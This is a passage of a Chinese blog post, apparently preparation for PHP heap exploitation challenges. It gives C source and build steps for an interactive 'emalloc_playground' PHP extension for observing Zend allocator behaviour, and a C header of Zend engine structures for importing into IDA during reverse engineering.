&lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;写了一个类似&lt;code&gt;how2heap&lt;/code&gt;的&lt;code&gt;malloc_playground&lt;/code&gt;的扩展，用于理解&lt;code&gt;emalloc&lt;/code&gt;的底层行为&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;//emalloc_playground.c&#xD;&#xA;/* emalloc_playground extension for PHP */&#xD;&#xA;#ifdef HAVE_CONFIG_H&#xD;&#xA;#include &amp;#34;config.h&amp;#34;&#xD;&#xA;#endif&#xD;&#xA;&#xD;&#xA;#include &amp;#34;php.h&amp;#34;&#xD;&#xA;#include &amp;#34;php_emalloc_playground.h&amp;#34;&#xD;&#xA;#include &amp;#34;emalloc_playground_arginfo.h&amp;#34;&#xD;&#xA;#include &amp;lt;stdio.h&amp;gt;&#xD;&#xA;#include &amp;lt;stdlib.h&amp;gt;&#xD;&#xA;#include &amp;lt;inttypes.h&amp;gt;&#xD;&#xA;#include &amp;lt;ctype.h&amp;gt;&#xD;&#xA;#include &amp;lt;string.h&amp;gt;&#xD;&#xA;#include &amp;lt;sys/types.h&amp;gt;&#xD;&#xA;#include &amp;lt;unistd.h&amp;gt;&#xD;&#xA;&#xD;&#xA;/* 分配记录结构 */&#xD;&#xA;typedef struct {&#xD;&#xA;    void *ptr;&#xD;&#xA;    size_t size;&#xD;&#xA;} allocation_t;&#xD;&#xA;&#xD;&#xA;/* 全局状态 */&#xD;&#xA;static struct {&#xD;&#xA;    allocation_t *allocations;&#xD;&#xA;    size_t count;&#xD;&#xA;    size_t capacity;&#xD;&#xA;    zend_bool initialized;&#xD;&#xA;} playground_state = {0};&#xD;&#xA;&#xD;&#xA;/* 初始化模块 */&#xD;&#xA;PHP_MINIT_FUNCTION(emalloc_playground)&#xD;&#xA;{&#xD;&#xA;    playground_state.allocations = ecalloc(8, sizeof(allocation_t));&#xD;&#xA;    playground_state.capacity = 8;&#xD;&#xA;    playground_state.count = 0;&#xD;&#xA;    playground_state.initialized = 1;&#xD;&#xA;    return SUCCESS;&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;/* 关闭模块 */&#xD;&#xA;PHP_MSHUTDOWN_FUNCTION(emalloc_playground)&#xD;&#xA;{&#xD;&#xA;    if (playground_state.initialized) {&#xD;&#xA;        for (size_t i = 0; i &amp;lt; playground_state.count; i&amp;#43;&amp;#43;) {&#xD;&#xA;            if (playground_state.allocations[i].ptr) {&#xD;&#xA;                efree(playground_state.allocations[i].ptr);&#xD;&#xA;            }&#xD;&#xA;        }&#xD;&#xA;        efree(playground_state.allocations);&#xD;&#xA;        playground_state.initialized = 0;&#xD;&#xA;    }&#xD;&#xA;    return SUCCESS;&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;/* 辅助函数：移除首尾空格 */&#xD;&#xA;static void string_trim(char *s) {&#xD;&#xA;    char *p = s;&#xD;&#xA;    while (isspace((unsigned char)*p)) p&amp;#43;&amp;#43;;&#xD;&#xA;    if (p != s) memmove(s, p, strlen(p) &amp;#43; 1);&#xD;&#xA;    size_t len = strlen(s);&#xD;&#xA;    while (len &amp;gt; 0 &amp;amp;&amp;amp; isspace((unsigned char)s[len-1])) s[--len] = &amp;#39;\0&amp;#39;;&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;/* 解析大小字符串（支持十六进制） */&#xD;&#xA;static size_t parse_size_string(const char *s) {&#xD;&#xA;    if (!s) return 0;&#xD;&#xA;    while (isspace((unsigned char)*s)) s&amp;#43;&amp;#43;;&#xD;&#xA;    if (s[0]==&amp;#39;0&amp;#39; &amp;amp;&amp;amp; (s[1]==&amp;#39;x&amp;#39; || s[1]==&amp;#39;X&amp;#39;)) {&#xD;&#xA;        return (size_t) strtoull(s&amp;#43;2, NULL, 16);&#xD;&#xA;    } else {&#xD;&#xA;        return (size_t) strtoull(s, NULL, 10);&#xD;&#xA;    }&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;/* 添加新分配记录 */&#xD;&#xA;static size_t add_allocation(void *ptr, size_t size) {&#xD;&#xA;    if (!playground_state.initialized) return SIZE_MAX;&#xD;&#xA;    &#xD;&#xA;    if (playground_state.count &amp;#43; 1 &amp;gt; playground_state.capacity) {&#xD;&#xA;        size_t newcap = playground_state.capacity * 2;&#xD;&#xA;        allocation_t *newalloc = erealloc(&#xD;&#xA;            playground_state.allocations, &#xD;&#xA;            sizeof(allocation_t) * newcap&#xD;&#xA;        );&#xD;&#xA;        if (!newalloc) return SIZE_MAX;&#xD;&#xA;        &#xD;&#xA;        playground_state.allocations = newalloc;&#xD;&#xA;        playground_state.capacity = newcap;&#xD;&#xA;    }&#xD;&#xA;    &#xD;&#xA;    playground_state.allocations[playground_state.count].ptr = ptr;&#xD;&#xA;    playground_state.allocations[playground_state.count].size = size;&#xD;&#xA;    return playground_state.count&amp;#43;&amp;#43;;&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;/* 核心交互函数 */&#xD;&#xA;PHP_FUNCTION(emalloc_playground)&#xD;&#xA;{&#xD;&#xA;    ZEND_PARSE_PARAMETERS_NONE();&#xD;&#xA;    &#xD;&#xA;    if (!playground_state.initialized) {&#xD;&#xA;        php_error(E_WARNING, &amp;#34;Playground not initialized&amp;#34;);&#xD;&#xA;        RETURN_FALSE;&#xD;&#xA;    }&#xD;&#xA;&#xD;&#xA;    pid_t pid = getpid();&#xD;&#xA;    php_printf(&amp;#34;=== PHP emalloc Playground ===\n&amp;#34;);&#xD;&#xA;    php_printf(&amp;#34;PID: %d\n&amp;#34;, (int)pid);&#xD;&#xA;    php_printf(&amp;#34;Type &amp;#39;help&amp;#39; for commands\n&amp;#34;);&#xD;&#xA;&#xD;&#xA;    char linebuf[512];&#xD;&#xA;    while (1) {&#xD;&#xA;        php_printf(&amp;#34;&amp;gt; &amp;#34;);&#xD;&#xA;        if (fgets(linebuf, sizeof(linebuf), stdin) == NULL) {&#xD;&#xA;            php_printf(&amp;#34;\nExit: EOF received\n&amp;#34;);&#xD;&#xA;            break;&#xD;&#xA;        }&#xD;&#xA;        &#xD;&#xA;        string_trim(linebuf);&#xD;&#xA;        if (linebuf[0] == &amp;#39;\0&amp;#39;) continue;&#xD;&#xA;&#xD;&#xA;        char *cmd = strtok(linebuf, &amp;#34; \t&amp;#34;);&#xD;&#xA;        if (!cmd) continue;&#xD;&#xA;&#xD;&#xA;        if (strcmp(cmd, &amp;#34;exit&amp;#34;) == 0 || strcmp(cmd, &amp;#34;quit&amp;#34;) == 0) {&#xD;&#xA;            php_printf(&amp;#34;Exiting playground\n&amp;#34;);&#xD;&#xA;            break;&#xD;&#xA;&#xD;&#xA;        } else if (strcmp(cmd, &amp;#34;pid&amp;#34;) == 0) {&#xD;&#xA;            php_printf(&amp;#34;Process ID: %d\n&amp;#34;, (int)pid);&#xD;&#xA;&#xD;&#xA;        } else if (strcmp(cmd, &amp;#34;emalloc&amp;#34;) == 0 ||strcmp(cmd, &amp;#34;malloc&amp;#34;) == 0) {&#xD;&#xA;            char *arg = strtok(NULL, &amp;#34; \t&amp;#34;);&#xD;&#xA;            size_t sz = parse_size_string(arg);&#xD;&#xA;            &#xD;&#xA;            if (sz == 0) {&#xD;&#xA;                php_printf(&amp;#34;Error: Size must be &amp;gt; 0\n&amp;#34;);&#xD;&#xA;                continue;&#xD;&#xA;            }&#xD;&#xA;&#xD;&#xA;            void *p = emalloc(sz);&#xD;&#xA;            memset(p, 0xCC, sz); // 填充测试模式&#xD;&#xA;            &#xD;&#xA;            size_t idx = add_allocation(p, sz);&#xD;&#xA;            if (idx == SIZE_MAX) {&#xD;&#xA;                php_printf(&amp;#34;Error: Failed to store allocation\n&amp;#34;);&#xD;&#xA;                efree(p);&#xD;&#xA;                continue;&#xD;&#xA;            }&#xD;&#xA;            &#xD;&#xA;            php_printf(&amp;#34;[%zu] Allocated %zu bytes at 0x%&amp;#34; PRIxPTR &amp;#34;\n&amp;#34;, &#xD;&#xA;                      idx, sz, (uintptr_t)p);&#xD;&#xA;&#xD;&#xA;        } else if (strcmp(cmd, &amp;#34;calloc&amp;#34;) == 0) {&#xD;&#xA;            char *arg1 = strtok(NULL, &amp;#34; \t&amp;#34;);&#xD;&#xA;            char *arg2 = strtok(NULL, &amp;#34; \t&amp;#34;);&#xD;&#xA;            size_t nm = parse_size_string(arg1);&#xD;&#xA;            size_t sz = parse_size_string(arg2);&#xD;&#xA;            &#xD;&#xA;            if (nm == 0 || sz == 0) {&#xD;&#xA;                php_printf(&amp;#34;Error: Invalid calloc parameters\n&amp;#34;);&#xD;&#xA;                continue;&#xD;&#xA;            }&#xD;&#xA;&#xD;&#xA;            size_t total_size;&#xD;&#xA;            if (__builtin_mul_overflow(nm, sz, &amp;amp;total_size)) {&#xD;&#xA;                php_printf(&amp;#34;Error: Size overflow\n&amp;#34;);&#xD;&#xA;                continue;&#xD;&#xA;            }&#xD;&#xA;&#xD;&#xA;            void *p = ecalloc(nm, sz);&#xD;&#xA;            size_t idx = add_allocation(p, total_size);&#xD;&#xA;            if (idx == SIZE_MAX) {&#xD;&#xA;                php_printf(&amp;#34;Error: Failed to store allocation\n&amp;#34;);&#xD;&#xA;                efree(p);&#xD;&#xA;                continue;&#xD;&#xA;            }&#xD;&#xA;            &#xD;&#xA;            php_printf(&amp;#34;[%zu] Calloc allocated %zu bytes at 0x%&amp;#34; PRIxPTR &amp;#34;\n&amp;#34;, &#xD;&#xA;                      idx, total_size, (uintptr_t)p);&#xD;&#xA;&#xD;&#xA;        } else if (strcmp(cmd, &amp;#34;realloc&amp;#34;) == 0) {&#xD;&#xA;            char *idxs = strtok(NULL, &amp;#34; \t&amp;#34;);&#xD;&#xA;            char *szs = strtok(NULL, &amp;#34; \t&amp;#34;);&#xD;&#xA;            if (!idxs || !szs) {&#xD;&#xA;                php_printf(&amp;#34;Usage: realloc &amp;lt;index&amp;gt; &amp;lt;size&amp;gt;\n&amp;#34;);&#xD;&#xA;                continue;&#xD;&#xA;            }&#xD;&#xA;            &#xD;&#xA;            size_t idx = (size_t) strtoull(idxs, NULL, 10);&#xD;&#xA;            size_t newsz = parse_size_string(szs);&#xD;&#xA;            &#xD;&#xA;            if (idx &amp;gt;= playground_state.count || &#xD;&#xA;                !playground_state.allocations[idx].ptr) {&#xD;&#xA;                php_printf(&amp;#34;Error: Invalid index %zu\n&amp;#34;, idx);&#xD;&#xA;                continue;&#xD;&#xA;            }&#xD;&#xA;            &#xD;&#xA;            void *oldp = playground_state.allocations[idx].ptr;&#xD;&#xA;            void *newp = erealloc(oldp, newsz);&#xD;&#xA;            &#xD;&#xA;            if (!newp &amp;amp;&amp;amp; newsz &amp;gt; 0) {&#xD;&#xA;                php_printf(&amp;#34;Error: Realloc failed for index %zu\n&amp;#34;, idx);&#xD;&#xA;                continue;&#xD;&#xA;            }&#xD;&#xA;            &#xD;&#xA;            playground_state.allocations[idx].ptr = newp;&#xD;&#xA;            playground_state.allocations[idx].size = newsz;&#xD;&#xA;            &#xD;&#xA;            php_printf(&amp;#34;[%zu] Reallocated to %zu bytes at 0x%&amp;#34; PRIxPTR &amp;#34;\n&amp;#34;, &#xD;&#xA;                      idx, newsz, (uintptr_t)newp);&#xD;&#xA;&#xD;&#xA;        } else if (strcmp(cmd, &amp;#34;free&amp;#34;) == 0) {&#xD;&#xA;            char *idxs = strtok(NULL, &amp;#34; \t&amp;#34;);&#xD;&#xA;            if (!idxs) {&#xD;&#xA;                php_printf(&amp;#34;Usage: free &amp;lt;index&amp;gt;\n&amp;#34;);&#xD;&#xA;                continue;&#xD;&#xA;            }&#xD;&#xA;            &#xD;&#xA;            size_t idx = (size_t) strtoull(idxs, NULL, 10);&#xD;&#xA;            if (idx &amp;gt;= playground_state.count || &#xD;&#xA;                !playground_state.allocations[idx].ptr) {&#xD;&#xA;                php_printf(&amp;#34;Error: Invalid index %zu\n&amp;#34;, idx);&#xD;&#xA;                continue;&#xD;&#xA;            }&#xD;&#xA;            &#xD;&#xA;            efree(playground_state.allocations[idx].ptr);&#xD;&#xA;            playground_state.allocations[idx].ptr = NULL;&#xD;&#xA;            playground_state.allocations[idx].size = 0;&#xD;&#xA;            php_printf(&amp;#34;[%zu] Freed\n&amp;#34;, idx);&#xD;&#xA;&#xD;&#xA;        } else if (strcmp(cmd, &amp;#34;show&amp;#34;) == 0 || strcmp(cmd, &amp;#34;list&amp;#34;) == 0) {&#xD;&#xA;            php_printf(&amp;#34;\nActive Allocations:\n&amp;#34;);&#xD;&#xA;            php_printf(&amp;#34;Index   Address          Size\n&amp;#34;);&#xD;&#xA;            php_printf(&amp;#34;--------------------------------\n&amp;#34;);&#xD;&#xA;            &#xD;&#xA;            for (size_t i = 0; i &amp;lt; playground_state.count; i&amp;#43;&amp;#43;) {&#xD;&#xA;                if (playground_state.allocations[i].ptr) {&#xD;&#xA;                    php_printf(&amp;#34;%-6zu  0x%-14&amp;#34; PRIxPTR &amp;#34;  %zu\n&amp;#34;, &#xD;&#xA;                              i, &#xD;&#xA;                              (uintptr_t)playground_state.allocations[i].ptr,&#xD;&#xA;                              playground_state.allocations[i].size);&#xD;&#xA;                }&#xD;&#xA;            }&#xD;&#xA;&#xD;&#xA;        } else if (strcmp(cmd, &amp;#34;clear&amp;#34;) == 0) {&#xD;&#xA;            size_t freed = 0;&#xD;&#xA;            for (size_t i = 0; i &amp;lt; playground_state.count; i&amp;#43;&amp;#43;) {&#xD;&#xA;                if (playground_state.allocations[i].ptr) {&#xD;&#xA;                    efree(playground_state.allocations[i].ptr);&#xD;&#xA;                    playground_state.allocations[i].ptr = NULL;&#xD;&#xA;                    playground_state.allocations[i].size = 0;&#xD;&#xA;                    freed&amp;#43;&amp;#43;;&#xD;&#xA;                }&#xD;&#xA;            }&#xD;&#xA;            php_printf(&amp;#34;Freed %zu allocations\n&amp;#34;, freed);&#xD;&#xA;&#xD;&#xA;        } else if (strcmp(cmd, &amp;#34;help&amp;#34;) == 0) {&#xD;&#xA;            php_printf(&amp;#34;\nAvailable Commands:\n&amp;#34;);&#xD;&#xA;            php_printf(&amp;#34;  malloc &amp;lt;size&amp;gt;       - Allocate memory (e.g., malloc 1024)\n&amp;#34;);&#xD;&#xA;            php_printf(&amp;#34;  calloc &amp;lt;num&amp;gt; &amp;lt;size&amp;gt; - Allocate zeroed memory\n&amp;#34;);&#xD;&#xA;            php_printf(&amp;#34;  realloc &amp;lt;idx&amp;gt; &amp;lt;size&amp;gt;- Resize allocation\n&amp;#34;);&#xD;&#xA;            php_printf(&amp;#34;  free &amp;lt;idx&amp;gt;          - Free allocation\n&amp;#34;);&#xD;&#xA;            php_printf(&amp;#34;  show                - List active allocations\n&amp;#34;);&#xD;&#xA;            php_printf(&amp;#34;  clear               - Free all allocations\n&amp;#34;);&#xD;&#xA;            php_printf(&amp;#34;  pid                 - Show process ID\n&amp;#34;);&#xD;&#xA;            php_printf(&amp;#34;  help                - Show this help\n&amp;#34;);&#xD;&#xA;            php_printf(&amp;#34;  exit/quit           - Exit playground\n&amp;#34;);&#xD;&#xA;&#xD;&#xA;        } else {&#xD;&#xA;            php_printf(&amp;#34;Unknown command: &amp;#39;%s&amp;#39; (type &amp;#39;help&amp;#39; for commands)\n&amp;#34;, cmd);&#xD;&#xA;        }&#xD;&#xA;    }&#xD;&#xA;    &#xD;&#xA;    RETURN_TRUE;&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;/* 扩展函数列表 */&#xD;&#xA;static const zend_function_entry emalloc_playground_functions[] = {&#xD;&#xA;    PHP_FE(emalloc_playground, arginfo_emalloc_playground)&#xD;&#xA;    PHP_FE_END&#xD;&#xA;};&#xD;&#xA;&#xD;&#xA;/* 模块入口 */&#xD;&#xA;zend_module_entry emalloc_playground_module_entry = {&#xD;&#xA;    STANDARD_MODULE_HEADER,&#xD;&#xA;    &amp;#34;emalloc_playground&amp;#34;,                    /* Extension name */&#xD;&#xA;    emalloc_playground_functions,            /* Function entries */&#xD;&#xA;    PHP_MINIT(emalloc_playground),           /* Module init */&#xD;&#xA;    PHP_MSHUTDOWN(emalloc_playground),       /* Module shutdown */&#xD;&#xA;    NULL,                                    /* Request init */&#xD;&#xA;    NULL,                                    /* Request shutdown */&#xD;&#xA;    NULL,                                    /* Module info */&#xD;&#xA;    &amp;#34;1.0&amp;#34;,                                   /* Version */&#xD;&#xA;    STANDARD_MODULE_PROPERTIES&#xD;&#xA;};&#xD;&#xA;&#xD;&#xA;#ifdef COMPILE_DL_EMALLOC_PLAYGROUND&#xD;&#xA;ZEND_GET_MODULE(emalloc_playground)&#xD;&#xA;#endif&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;emalloc_playground.stub.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xD;&#xA;&#xD;&#xA;/**&#xD;&#xA; * @generate-class-entries&#xD;&#xA; * @undocumentable&#xD;&#xA; */&#xD;&#xA;&#xD;&#xA; function emalloc_playground(): bool {}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;php ./ext_skel.php --ext emalloc_playground --onlyunix --vendor &amp;#34;j4f&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后将上面的两个文件复制进相应的文件里&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;phpize&#xD;&#xA;./configure --with-php-config=/usr/bin/php-config&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;这里我修改了&lt;code&gt;Makefile&lt;/code&gt;中的CFLAGS为&lt;code&gt;CFLAGS = -g3 -O0&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;pre&gt;&lt;code&gt;make&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后把生成的扩展文件复制进&lt;code&gt;extension_dir&lt;/code&gt;，在&lt;code&gt;php.ini&lt;/code&gt;中加上&lt;code&gt;extension=emalloc_playground.so&lt;/code&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;ida逆向&#34;&gt;&lt;span&gt;ida逆向&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#ida%e9%80%86%e5%90%91&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;在phppwn逆向的时候，常遇到类似这样的东西：&lt;/p&gt;&#xA;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/img/phppwn/phppwn_re_struct/php_re_struct.png&#34; title=&#34;/img/phppwn/phppwn_re_struct/php_re_struct.png&#34; data-thumbnail=&#34;/img/phppwn/phppwn_re_struct/php_re_struct.png&#34; data-sub-html=&#34;&lt;h2&gt;/img/phppwn/phppwn_re_struct/php_re_struct.png&lt;/h2&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/img/phppwn/phppwn_re_struct/php_re_struct.png&#39; alt=&#34;/img/phppwn/phppwn_re_struct/php_re_struct.png&#34; width=&#34;900px&#34;&gt;&lt;/a&gt;&#xA;&lt;p&gt;其实它是对传入参数的类型进行判断，但是看起来不太直观&lt;/p&gt;&#xA;&lt;p&gt;IDA中支持导入C头文件，修复一些结构体&lt;/p&gt;&#xA;&lt;p&gt;修复后：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( v15-&amp;gt;u1.v.type == IS_ARRAY )&#xD;&#xA;    {&#xD;&#xA;      if ( v16-&amp;gt;u1.v.type == IS_STRING )&#xD;&#xA;      {&lt;/code&gt;&lt;/pre&gt;&lt;br&gt;&#xD;&#xA;&lt;p&gt;导入方式：&lt;code&gt;File&lt;/code&gt; -&amp;gt; &lt;code&gt;Load file&lt;/code&gt; -&amp;gt;  &lt;code&gt;Parse C header file&lt;/code&gt;，然后选择这个头文件导入。&lt;/p&gt;&#xA;&lt;p&gt;导入后就能看到&lt;code&gt;Local Types&lt;/code&gt;中有相关的结构体&lt;/p&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;p&gt;使用方式：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;右键需要convert的变量，选择&lt;code&gt;Convert to struct *...&lt;/code&gt;，其中常用的结构体有：&lt;code&gt;zval&lt;/code&gt;、&lt;code&gt;string&lt;/code&gt;、&lt;code&gt;array&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;至于相关变量结构体改成类似&lt;code&gt;IS_ARRAY&lt;/code&gt;。右键需要改的数字，选择&lt;code&gt;Enum&lt;/code&gt;，选择&lt;code&gt;zend_type&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;zval&lt;/code&gt;类型还需要额外设置union类型&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;//php_struct.h&#xD;&#xA;&#xD;&#xA;//定义基本类型&#xD;&#xA;typedef unsigned char uint8_t;&#xD;&#xA;typedef unsigned short uint16_t;&#xD;&#xA;typedef unsigned int uint32_t;&#xD;&#xA;typedef unsigned long long uint64_t;&#xD;&#xA;typedef long long int64_t;&#xD;&#xA;&#xD;&#xA;typedef unsigned char      zend_uchar;&#xD;&#xA;typedef long long          zend_long;&#xD;&#xA;typedef unsigned long zend_ulong;&#xD;&#xA;&#xD;&#xA;//zval.u1.type类型&#xD;&#xA;typedef enum {&#xD;&#xA;    IS_NULL = 0,&#xD;&#xA;    IS_FALSE = 1,&#xD;&#xA;    IS_TRUE = 2,&#xD;&#xA;    IS_LONG = 4,&#xD;&#xA;    IS_DOUBLE = 5,&#xD;&#xA;    IS_STRING = 6,&#xD;&#xA;    IS_ARRAY = 7,&#xD;&#xA;    IS_OBJECT = 8,&#xD;&#xA;    IS_RESOURCE = 9,&#xD;&#xA;    IS_REFERENCE = 10,&#xD;&#xA;    IS_CONSTANT = 11,&#xD;&#xA;    IS_CONSTANT_AS = 12,&#xD;&#xA;    _IS_BOOL = 13,&#xD;&#xA;    IS_CALLABLE = 14,&#xD;&#xA;    IS_INDIRECT = 15,&#xD;&#xA;    IS_PTR = 17&#xD;&#xA;} zend_type;&#xD;&#xA;&#xD;&#xA;//前置声明&#xD;&#xA;typedef struct _zval_struct zval;&#xD;&#xA;typedef struct _zend_array HashTable;&#xD;&#xA;typedef struct _zend_string zend_string;&#xD;&#xA;typedef struct _zend_object zend_object;&#xD;&#xA;typedef struct _zend_resource zend_resource;&#xD;&#xA;typedef struct _Bucket Bucket;&#xD;&#xA;typedef void (*dtor_func_t)(zval *pDest);&#xD;&#xA;typedef struct _zend_reference  zend_reference;&#xD;&#xA;typedef struct _zend_ast_ref    zend_ast_ref;&#xD;&#xA;typedef struct _zend_object_handlers zend_object_handlers;&#xD;&#xA;typedef struct _zend_class_entry     zend_class_entry;&#xD;&#xA;typedef union  _zend_function        zend_function;&#xD;&#xA;typedef struct _zend_refcounted_v zend_refcounted_v;&#xD;&#xA;&#xD;&#xA;//zend_refcounted_h&#xD;&#xA;typedef struct _zend_refcounted_v {&#xD;&#xA;    uint8_t    type;&#xD;&#xA;    uint8_t    flags;&#xD;&#xA;    uint16_t   gc_info;&#xD;&#xA;} zend_refcounted_v;&#xD;&#xA;&#xD;&#xA;typedef union _zend_refcounted_u {&#xD;&#xA;    zend_refcounted_v v;&#xD;&#xA;    uint32_t type_info;&#xD;&#xA;} zend_refcounted_u;&#xD;&#xA;&#xD;&#xA;typedef struct _zend_refcounted_h {&#xD;&#xA;    uint32_t refcount;&#xD;&#xA;    zend_refcounted_u u;&#xD;&#xA;} zend_refcounted_h;&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;//_zend_string&#xD;&#xA;typedef struct _zend_string {&#xD;&#xA;    zend_refcounted_h gc;  // 8字节&#xD;&#xA;    uint64_t h;            // 8字节&#xD;&#xA;    uint32_t len;          // 4字节&#xD;&#xA;    char val[1];           // 1字节（&amp;#43;3字节padding，对齐到8）&#xD;&#xA;}string;&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;typedef struct _zval_u1_v {&#xD;&#xA;    uint8_t type;&#xD;&#xA;    uint8_t type_flags;&#xD;&#xA;    uint8_t const_flags;&#xD;&#xA;    uint8_t reserved;&#xD;&#xA;} zval_u1_v;&#xD;&#xA;&#xD;&#xA;typedef union _zval_u1 {&#xD;&#xA;    zval_u1_v v;&#xD;&#xA;    uint32_t type_info;&#xD;&#xA;} zval_u1;&#xD;&#xA;&#xD;&#xA;typedef union _zval_u2 {&#xD;&#xA;    uint32_t var_flags;&#xD;&#xA;    uint32_t next;&#xD;&#xA;    uint32_t cache_slot;&#xD;&#xA;    uint32_t lineno;&#xD;&#xA;    uint32_t num_args;&#xD;&#xA;    uint32_t fe_pos;&#xD;&#xA;} zval_u2;&#xD;&#xA;&#xD;&#xA;//这里一些对象使用void*避免具体类型&#xD;&#xA;typedef union _zend_value {&#xD;&#xA;    zend_long         lval;&#xD;&#xA;    double            dval;&#xD;&#xA;    void             *counted;&#xD;&#xA;    zend_string      *str;&#xD;&#xA;    HashTable        *arr;&#xD;&#xA;    zend_object      *obj;&#xD;&#xA;    zend_resource    *res;&#xD;&#xA;    zend_reference   *ref;&#xD;&#xA;    zend_ast_ref     *ast;&#xD;&#xA;    _zval_struct     *zv;&#xD;&#xA;    void             *ptr;&#xD;&#xA;    zend_class_entry *ce;&#xD;&#xA;    zend_function    *func;&#xD;&#xA;    struct {&#xD;&#xA;        uint32_t w1;&#xD;&#xA;        uint32_t w2;&#xD;&#xA;    } ww;&#xD;&#xA;} zend_value;&#xD;&#xA;&#xD;&#xA;typedef struct _zval_struct {&#xD;&#xA;    zend_value value;  // 8字节&#xD;&#xA;    zval_u1 u1;        // 4字节&#xD;&#xA;    zval_u2 u2;        // 4字节&#xD;&#xA;}zval;&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;//_zend_array&#xD;&#xA;typedef struct _Bucket {&#xD;&#xA;    _zval_struct      val;&#xD;&#xA;    zend_ulong        h;&#xD;&#xA;    _zend_string      *key;&#xD;&#xA;}Bucket;&#xD;&#xA;&#xD;&#xA;typedef struct _zend_array_v&#xD;&#xA;{&#xD;&#xA;    zend_uchar    flags;&#xD;&#xA;    zend_uchar    nApplyCount;&#xD;&#xA;    zend_uchar    nIteratorsCount;&#xD;&#xA;    zend_uchar    reserve;&#xD;&#xA;}_zend_array_v;&#xD;&#xA;&#xD;&#xA;typedef union _zend_array_u&#xD;&#xA;{&#xD;&#xA;    _zend_array_v v;&#xD;&#xA;    uint32_t flag;&#xD;&#xA;}_zend_array_u;&#xD;&#xA;&#xD;&#xA;typedef struct _zend_array&#xD;&#xA;{&#xD;&#xA;    zend_refcounted_h gc; //8字节&#xD;&#xA;    _zend_array_u u;&#xD;&#xA;    uint32_t          nTableMask;&#xD;&#xA;    Bucket           *arData;&#xD;&#xA;    uint32_t          nNumUsed;&#xD;&#xA;    uint32_t          nNumOfElements;&#xD;&#xA;    uint32_t          nTableSize; &#xD;&#xA;    uint32_t          nInternalPointer; &#xD;&#xA;    zend_long         nNextFreeElement;&#xD;&#xA;    dtor_func_t       pDestructor;&#xD;&#xA;}HashTable;&#xD;&#xA;&#xD;&#xA;//_zend_resource&#xD;&#xA;typedef struct _zend_resource {&#xD;&#xA;    zend_refcounted_h gc;&#xD;&#xA;    int               handle;&#xD;&#xA;    int               type;&#xD;&#xA;    void             *ptr;&#xD;&#xA;}zend_resource;&#xD;&#xA;&#xD;&#xA;//_zend_object&#xD;&#xA;typedef struct _zend_object {&#xD;&#xA;    zend_refcounted_h           gc;&#xD;&#xA;    uint32_t                    handle;&#xD;&#xA;    zend_class_entry           *ce;&#xD;&#xA;    const zend_object_handlers *handlers;&#xD;&#xA;    HashTable                  *properties;&#xD;&#xA;    _zval_struct                properties_table[1];&#xD;&#xA;}zend_object;&#xD;&#xA;typedef _zend_array array;&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;php堆内存管理&#34;&gt;&lt;span&gt;php堆内存管理&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#php%e5%a0%86%e5%86%85%e5%ad%98%e7%ae%a1%e7%90%86&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 